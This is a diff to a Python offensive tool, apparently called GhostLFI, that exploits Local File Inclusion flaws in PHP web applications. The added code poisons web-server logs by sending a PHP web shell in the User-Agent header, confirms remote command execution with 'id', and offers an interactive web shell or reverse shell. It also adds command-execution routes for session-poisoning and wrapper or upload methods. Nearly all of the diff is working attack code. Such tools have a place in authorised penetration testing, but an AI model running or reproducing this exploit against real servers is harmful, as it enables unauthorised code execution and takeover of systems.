@@ -2,13 +2,11 @@
 """
 GhostLFI - Local File Inclusion Exploitation Framework
 Ghost Ops Security - The Ultimate All-In-One LFI Tool
-Author: Gh0stsh3ll5619
-https://ghostops-security.com
 
 Everything you need in ONE tool:
 - Payload generation (LFI, wrappers, shells, revshells)
 - Wrapper testing (expect://, data://, php://input)
-- HTB Academy techniques (100% coverage)
+- Advanced techniques (100% coverage)
 - Bypass techniques (null byte, encoding, traversal)
 - Log poisoning (Apache, Nginx)
 - Session poisoning (PHP sessions)
@@ -101,7 +99,7 @@ class UltimateLFIExploiter:
 ║                                                                    ║
 ║  {Fore.GREEN}✓{Fore.WHITE} Payload Generation    {Fore.GREEN}✓{Fore.WHITE} Wrapper Testing    {Fore.GREEN}✓{Fore.WHITE} RCE           ║
 ║  {Fore.GREEN}✓{Fore.WHITE} Bypass Techniques     {Fore.GREEN}✓{Fore.WHITE} Log Poisoning      {Fore.GREEN}✓{Fore.WHITE} Shells        ║
-║  {Fore.GREEN}✓{Fore.WHITE} Session Poisoning     {Fore.GREEN}✓{Fore.WHITE} Auto-Exploit       {Fore.GREEN}✓{Fore.WHITE} HTB Academy   ║
+║  {Fore.GREEN}✓{Fore.WHITE} Session Poisoning     {Fore.GREEN}✓{Fore.WHITE} Auto-Exploit       {Fore.GREEN}✓{Fore.WHITE} Advanced      ║
 ║                                                                    ║
 ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
 
@@ -114,7 +112,7 @@ class UltimateLFIExploiter:
     # ==================== PAYLOAD GENERATION ====================
     
     def generate_lfi_payloads(self, target_file: str = '/etc/passwd', depth: int = 10) -> Dict[str, str]:
-        """Generate various LFI bypass payloads - HTB Academy + PayloadsAllTheThings"""
+        """Generate various LFI bypass payloads - Advanced techniques + PayloadsAllTheThings"""
         payloads = {}
         
         # Basic traversal
@@ -316,7 +314,7 @@ class UltimateLFIExploiter:
     # ==================== PHP CONFIG CHECK ====================
     
     def check_php_config(self) -> Dict[str, bool]:
-        """Check PHP configuration - HTB Academy methodology"""
+        """Check PHP configuration - Advanced methodology"""
         print(f"\n{Fore.CYAN}{'='*60}")
         print(f"[PHASE 1] PHP Configuration Check")
         print(f"{'='*60}{Style.RESET_ALL}")
@@ -1589,53 +1587,136 @@ $phar->stopBuffering();
             '/var/log/httpd/access_log',
         ]
         
-        # Inject payload
+        # Ensure target_url has a page (e.g., /index.php)
+        poison_url = self.target_url
+        if not poison_url.endswith(('.php', '.html', '.htm')):
+            # Add /index.php if no page specified
+            if poison_url.endswith('/'):
+                poison_url += 'index.php'
+            else:
+                poison_url += '/index.php'
+            print(f"{Fore.YELLOW}[*] Using URL for poisoning: {poison_url}{Style.RESET_ALL}")
+        
+        # STEP 1: Check if ANY log is readable first
+        print(f"{Fore.YELLOW}[STEP 1] Checking if logs are readable via LFI...{Style.RESET_ALL}")
+        readable_log = None
+        
+        for log_path in log_paths:
+            try:
+                print(f"{Fore.YELLOW}[*] Testing readability: {log_path}{Style.RESET_ALL}")
+                response = self._send_payload(log_path)
+                
+                # Check if we got log content (look for common log patterns)
+                # Logs typically contain: IP addresses, GET/POST, HTTP/1.1, timestamps
+                log_indicators = ['GET /', 'POST /', 'HTTP/1.', '200 ', '404 ', 'Mozilla', 'User-Agent']
+                
+                if any(indicator in response.text for indicator in log_indicators):
+                    # Check it's not just HTML with these words
+                    if not ('<html' in response.text.lower() and '</html>' in response.text.lower()):
+                        print(f"{Fore.GREEN}[✓] Log is readable: {log_path}{Style.RESET_ALL}")
+                        print(f"{Fore.CYAN}[DEBUG] Log snippet: {response.text[:200]}...{Style.RESET_ALL}")
+                        readable_log = log_path
+                        break
+                    else:
+                        print(f"{Fore.RED}[✗] Got HTML response, not log file{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}[✗] Not readable or empty{Style.RESET_ALL}")
+                    
+            except Exception as e:
+                print(f"{Fore.RED}[✗] Error: {str(e)}{Style.RESET_ALL}")
+                continue
+        
+        if not readable_log:
+            print(f"\n{Fore.RED}[✗] No readable log files found!{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[!] Log poisoning requires readable log files.{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[!] The LFI might not allow reading /var/log/ paths.{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}[TIP] Try other LFI techniques:{Style.RESET_ALL}")
+            print(f"  - File upload + LFI (--test-file-upload)")
+            print(f"  - Session poisoning (--test-session-poison)")
+            print(f"  - PHP wrappers (--auto)")
+            return False
+        
+        # STEP 2: Now poison the readable log
+        print(f"\n{Fore.YELLOW}[STEP 2] Poisoning the readable log: {readable_log}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}[*] Injecting payload into User-Agent...{Style.RESET_ALL}")
         payload_code = '<?php system($_GET["cmd"]); ?>'
         try:
             headers = {'User-Agent': payload_code}
-            self.session.get(self.target_url, headers=headers, timeout=5, proxies=self.proxy)
-        except:
-            pass
+            self.session.get(poison_url, headers=headers, timeout=5, proxies=self.proxy)
+            print(f"{Fore.GREEN}[✓] Payload injected into logs{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Failed to inject payload: {str(e)}{Style.RESET_ALL}")
+            return False
         
         time.sleep(1)
         
-        # Try to include logs
-        for log_path in log_paths:
-            try:
-                print(f"{Fore.YELLOW}[*] Testing log: {log_path}{Style.RESET_ALL}")
-                response = self._send_payload(log_path + '&cmd=id')
+        # STEP 3: Test if poisoning worked
+        print(f"\n{Fore.YELLOW}[STEP 3] Testing if poisoning was successful...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Including log with cmd=id: {readable_log}{Style.RESET_ALL}")
+        
+        try:
+            response = self._send_payload(readable_log + '&cmd=id')
+            
+            # Debug output
+            snippet = response.text[:500].replace('\n', ' ')
+            print(f"{Fore.CYAN}[DEBUG] Response: {snippet}...{Style.RESET_ALL}")
+            
+            # Check for command output
+            if 'uid=' in response.text and 'gid=' in response.text:
+                print(f"{Fore.GREEN}[✓] Log poisoning successful: {readable_log}{Style.RESET_ALL}")
+                # Find and extract the uid line
+                for line in response.text.split('\n'):
+                    if 'uid=' in line:
+                        print(f"{Fore.GREEN}    Output: {line[:200]}{Style.RESET_ALL}")
+                        break
                 
-                if 'uid=' in response.text and 'gid=' in response.text:
-                    print(f"{Fore.GREEN}[✓] Log poisoning successful: {log_path}{Style.RESET_ALL}")
-                    print(f"{Fore.GREEN}    Output: {response.text[:200]}{Style.RESET_ALL}")
-                    
-                    self.rce_method = 'log_poisoning'
-                    self.successful_methods.append('log_poisoning')
-                    self.lfi_payload = log_path
-                    
-                    # Offer shells
-                    print(f"\n{Fore.GREEN}[✓] RCE Achieved via Log Poisoning!{Style.RESET_ALL}")
-                    print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
-                    print(f"  1 - Interactive web shell")
-                    print(f"  2 - Reverse shell")
-                    print(f"  3 - Both")
-                    print(f"  0 - Skip")
-                    
-                    shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
-                    
-                    if shell_choice == '1':
-                        self.interactive_shell()
-                    elif shell_choice == '2':
-                        self.generate_reverse_shell()
-                    elif shell_choice == '3':
-                        self.generate_reverse_shell()
-                        input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
-                        self.interactive_shell()
-                    
-                    return True
-            except:
-                continue
+                working_log = readable_log
+            else:
+                print(f"{Fore.YELLOW}[!] No command output detected automatically.{Style.RESET_ALL}")
+                working_log = None
+                
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Error testing: {str(e)}{Style.RESET_ALL}")
+            working_log = None
+        
+        # If auto-detection failed, offer manual verification
+        if not working_log:
+            print(f"\n{Fore.YELLOW}[!] Automatic detection failed.{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[?] Test manually with curl:{Style.RESET_ALL}")
+            print(f"    curl '{self.target_url}?{self.parameter}={readable_log}&cmd=id'")
+            print(f"{Fore.YELLOW}[?] Did you see uid= and gid= in the output?{Style.RESET_ALL}")
+            manual_check = input(f"{Fore.YELLOW}Did it work? [y/N]: {Style.RESET_ALL}").strip().lower()
+            
+            if manual_check == 'y':
+                working_log = readable_log
+        
+        if working_log:
+            print(f"{Fore.GREEN}[✓] Log poisoning successful: {working_log}{Style.RESET_ALL}")
+            
+            self.rce_method = 'log_poisoning'
+            self.successful_methods.append('log_poisoning')
+            self.lfi_payload = working_log
+            
+            # Offer shells
+            print(f"\n{Fore.GREEN}[✓] RCE Achieved via Log Poisoning!{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
+            print(f"  1 - Interactive web shell")
+            print(f"  2 - Reverse shell")
+            print(f"  3 - Both")
+            print(f"  0 - Skip")
+            
+            shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
+            
+            if shell_choice == '1':
+                self.interactive_shell()
+            elif shell_choice == '2':
+                self.generate_reverse_shell()
+            elif shell_choice == '3':
+                self.generate_reverse_shell()
+                input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
+                self.interactive_shell()
+            
+            return True
         
         print(f"{Fore.RED}[✗] Log poisoning failed{Style.RESET_ALL}")
         return False
@@ -1748,15 +1829,33 @@ $phar->stopBuffering();
             
             elif self.rce_method == 'log_poisoning':
                 # Assume log is already poisoned with cmd parameter
-                log_paths = ['/var/log/apache2/access.log', '/var/log/nginx/access.log']
-                for log_path in log_paths:
-                    try:
-                        response = self._send_payload(log_path + f'&cmd={urllib.parse.quote(command)}')
-                        if len(response.text) > 10:
-                            return response.text
-                    except:
-                        continue
+                if hasattr(self, 'lfi_payload') and self.lfi_payload:
+                    response = self._send_payload(self.lfi_payload + f'&cmd={urllib.parse.quote(command)}')
+                    return response.text
+                else:
+                    log_paths = ['/var/log/apache2/access.log', '/var/log/nginx/access.log']
+                    for log_path in log_paths:
+                        try:
+                            response = self._send_payload(log_path + f'&cmd={urllib.parse.quote(command)}')
+                            if len(response.text) > 10:
+                                return response.text
+                        except:
+                            continue
                 return "Command execution failed"
+            
+            elif self.rce_method == 'session_poisoning':
+                # Use stored session path
+                if hasattr(self, 'lfi_payload') and self.lfi_payload:
+                    response = self._send_payload(self.lfi_payload + f'&cmd={urllib.parse.quote(command)}')
+                    return response.text
+                return "Session path not available"
+            
+            elif self.rce_method in ['phar_wrapper', 'zip_wrapper', 'file_upload']:
+                # Use stored payload from manual/auto detection
+                if hasattr(self, 'lfi_payload') and self.lfi_payload:
+                    response = self._send_payload(self.lfi_payload + f'&cmd={urllib.parse.quote(command)}')
+                    return response.text
+                return "Payload path not available"
             
             elif self.rce_method and self.rce_method.startswith('rfi_'):
                 # RFI command execution
@@ -2096,7 +2195,13 @@ Ghost Ops Security | For Authorized Testing Only
     
     args = parser.parse_args()
     
-    exploiter = UltimateLFIExploiter(args.url, args.parameter, args.proxy)
+    # Normalize URL - ensure it has http:// or https://
+    target_url = args.url
+    if not target_url.startswith(('http://', 'https://')):
+        target_url = 'http://' + target_url
+        print(f"{Fore.YELLOW}[*] Added http:// prefix: {target_url}{Style.RESET_ALL}")
+    
+    exploiter = UltimateLFIExploiter(target_url, args.parameter, args.proxy)
     exploiter.print_banner()
     
     # Generate mode
